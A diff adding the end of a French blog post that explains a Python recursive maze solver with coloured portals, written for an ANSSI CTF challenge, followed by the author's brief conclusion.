+            <span style="color:#66d9ef">return</span> True
+    <span style="color:#66d9ef">elif</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">6</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;wall at </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (x, y))
+        pot <span style="color:#f92672">=</span> pot[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+        <span style="color:#66d9ef">return</span> False
+    <span style="color:#66d9ef">elif</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">10</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">30</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">50</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">70</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">90</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">110</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">130</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">150</span>:
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;visited at </span><span style="color:#e6db74">%d</span><span style="color:#e6db74">,</span><span style="color:#e6db74">%d</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> (x, y))
+        pot <span style="color:#f92672">=</span> pot[<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+        <span style="color:#66d9ef">return</span> False
+
+ <span style="color:#75715e">#   print(&#39;visiting %d,%d&#39; % (x, y))</span>
+
+    <span style="color:#75715e"># mark as visited</span>
+    <span style="color:#66d9ef">if</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">20</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">40</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">60</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">80</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">120</span> <span style="color:#f92672">or</span> grid[x][y] <span style="color:#f92672">==</span> <span style="color:#ae81ff">140</span>:
+        grid[x][y] <span style="color:#f92672">=</span> grid[x][y] <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>
+
+    <span style="color:#75715e"># explore neighbors clockwise starting by the one on the right</span>
+    <span style="color:#66d9ef">if</span> ((x <span style="color:#f92672">&lt;</span> len(grid) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> searchrouge(x <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, y, <span style="color:#e6db74">&#34;S&#34;</span>, pot,endx,endy, grid,claire,DUO)) <span style="color:#f92672">or</span> (y <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> searchrouge(x, y <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;W&#34;</span>, pot,endx,endy, grid,claire,DUO)) <span style="color:#f92672">or</span> (x <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> searchrouge(x <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, y, <span style="color:#e6db74">&#34;N&#34;</span>, pot,endx,endy, grid,claire,DUO)) <span style="color:#f92672">or</span> (y <span style="color:#f92672">&lt;</span> len(grid) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">and</span> searchrouge(x, y <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;E&#34;</span>, pot,endx,endy, grid,claire, DUO))):
+        <span style="color:#66d9ef">return</span> True
+    <span style="color:#66d9ef">if</span> magouille <span style="color:#f92672">==</span> True:
+        grid[resetmagouillex][resetmagouilley]<span style="color:#f92672">=</span> <span style="color:#ae81ff">2</span>
+        magouille <span style="color:#f92672">=</span> False
+
+    <span style="color:#66d9ef">return</span> False
+</code></pre></div><p>Voici comment fonctionne le script :</p>
+<p>Sur chaque case nous testons si la couleur est égale à la porte qu&rsquo;on cherche. Si c&rsquo;est le cas on vérifie si ça correspond à la fin. Si ça ne correspond pas à la fin on regarde la direction qui a été prise et on répète le mouvement car on ne s&rsquo;arrête jamais sur une porte. Ensuite on cherche une nouvelle porte. Si la &ldquo;souris&rdquo; fait chemin inverse car elle est bloquée nous considérons que temporairement la porte qui vient d'être passée doit être considérée comme un mur (cf ligne avec erreur de parcours). Dans ce cas là on &ldquo;magouille&rdquo; un peu et on stocke la position où nous avons mis un mur et nous remettons la bonne couleur lorsque la &ldquo;souris&rdquo; est partie. Si nous ne faisons pas ça la &ldquo;souris&rdquo; passe son temps à entrer et sortir.</p>
+<p>Si ça ne correspond pas à sa couleur nous regardons si c&rsquo;est un mur. Toutes les couleurs différentes de celles recherchées sont considérées comme un mur. Ensuite nous regardons si nous sommes déjà passé sur cette case, si c&rsquo;est le cas nous enlevons une lettre à notre chemin de fin.</p>
+<p>Ici il fallait faire attention car il fallait bien marquer le chemin comme visité uniquement si nous n'étions jamais passé par là avec la recherche actuelle de de couleur en cours. En gros ce chemin peut être un cul de sac pour un portail bleu mais pas rouge. Pour ça j&rsquo;ai donc utilisé le même système que les droits sous linux (777 &lt;3) mais avec 4 couleurs. La dizaine du chiffre associé à la couleur était utilisée.</p>
+<p>Voilà pour l&rsquo;essentiel de mon programme le but était de dégager les points importants car il y avait des moyens bien plus rapide pour le faire. En tout il fait plus de 600 lignes donc si vous le voulait je peux vous l&rsquo;envoyer avec plaisir.</p>
+<h1 id="conlusion">Conlusion</h1>
+<p>C'était la première fois que je participais à un CTF de l&rsquo;ANSSI et c'était vraiment excellent ! J&rsquo;ai pu faire des rencontres et tout le tralala au détriment de mes nuits. Cela aussi permit le lancement de ce site ! Encore un merci à eux ! :D</p>
+
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
+
+
+
+
+
+    
+
+
+
+    </body>
+</html>
